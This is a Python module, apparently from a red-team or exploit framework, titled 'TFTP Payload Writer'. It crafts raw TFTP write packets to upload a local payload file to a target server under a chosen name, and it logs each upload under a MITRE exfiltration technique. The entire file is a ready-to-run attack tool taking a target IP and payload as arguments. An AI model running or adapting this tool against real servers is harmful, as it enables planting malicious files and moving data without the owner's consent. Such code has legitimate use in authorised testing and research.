# modules/exploits/tftp_payload_writer.py

import socket
import argparse
import os
from datetime import datetime
import json

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1048.003"  # Exfiltration Over Alternative Protocol: TFTP

def log_event(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def send_tftp_write(ip, port, filename, local_file):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    mode = b'octet'
    req = b'\x00\x02' + filename.encode() + b'\x00' + mode + b'\x00'
    sock.sendto(req, (ip, port))

    with open(local_file, 'rb') as f:
        block_num = 1
        while True:
            data = f.read(512)
            if not data:
                break
            pkt = b'\x00\x03' + block_num.to_bytes(2, 'big') + data
            sock.sendto(pkt, (ip, port))
            sock.recvfrom(1024)
            block_num += 1

    log_event({
        "timestamp": datetime.utcnow().isoformat(),
        "target": ip,
        "file_uploaded": filename,
        "local_file": local_file,
        "ttp": MITRE_TTP
    })

    print(f"[âœ“] File {local_file} uploaded as {filename} to {ip}:{port}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="TFTP Payload Writer")
    parser.add_argument("--ip", required=True, help="Target TFTP server IP")
    parser.add_argument("--port", type=int, default=69, help="TFTP port (default 69)")
    parser.add_argument("--filename", required=True, help="Remote filename to write")
    parser.add_argument("--local", required=True, help="Local payload file to send")
    args = parser.parse_args()

    send_tftp_write(args.ip, args.port, args.filename, args.local)
